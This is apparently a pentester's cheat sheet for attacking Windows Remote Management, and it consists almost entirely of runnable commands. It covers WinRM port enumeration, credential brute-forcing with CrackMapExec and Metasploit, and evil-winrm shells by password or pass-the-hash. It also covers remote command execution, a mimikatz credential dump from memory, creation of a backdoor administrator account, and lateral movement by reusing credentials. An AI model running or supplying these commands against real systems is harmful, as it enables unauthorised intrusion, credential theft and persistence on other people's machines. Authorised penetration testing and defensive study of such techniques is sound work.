!!! tip "Start here"
    `evil-winrm -i <target> -u <user> -p <pass>` is the fastest path to a shell with valid credentials. WinRM runs on port 5985 (HTTP) or 5986 (HTTPS) — check both. Pass-the-hash also works: `evil-winrm -i <target> -u <user> -H <ntlm_hash>`.

## Enumeration
### Check for Open WinRM Ports
```bash
nmap -p 5985,5986 --script http-winrm-info,winrm-brute <target-ip>
```

CrackMapExec:
```bash
crackmapexec winrm <target-ip>
```

Confirm manually using cURL:
```bash
curl -vk http://<target-ip>:5985/wsman
```

A successful response indicates WinRM is active.

## Authentication Attacks
### Brute-Force Credentials
CrackMapExec:
```bash
crackmapexec winrm <target-ip> -u users.txt -p passwords.txt
```

MSF:
```bash
msfconsole
use auxiliary/scanner/winrm/winrm_login
set RHOSTS <target-ip>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

## Evil-winrm
```bash
evil-winrm -i $IP -u user -p password
```

```bash
evil-winrm -i TARGET -u admin -H NTLM_HASH
```
### Show WinRM Options
```
evil-winrm > menu
```

## Post-Exploitation & Lateral Movement
CrackMapExec for authenticated RCE execution:
```bash
crackmapexec winrm <target-ip> -u <user> -p <password> -x "whoami"
```

Further reconnaissance:
```bash
Get-NetComputer -Domain domain.local
Get-NetUser -Domain domain.local
```

### Extracting Credentials from Memory
Once inside, use mimikatz:
```powershell
mimikatz # sekurlsa::logonpasswords
```

### Adding a New Administrator User
```powershell
net user pentest Password123! /add
net localgroup administrators pentest /add
```

### Pivoting via WinRM
DON'T FORGET to try credentials on all targets!

Execute commands via CrackMapExec:
```bash
crackmapexec winrm <target-ip> -u <user> -p <password> -x "whoami"
```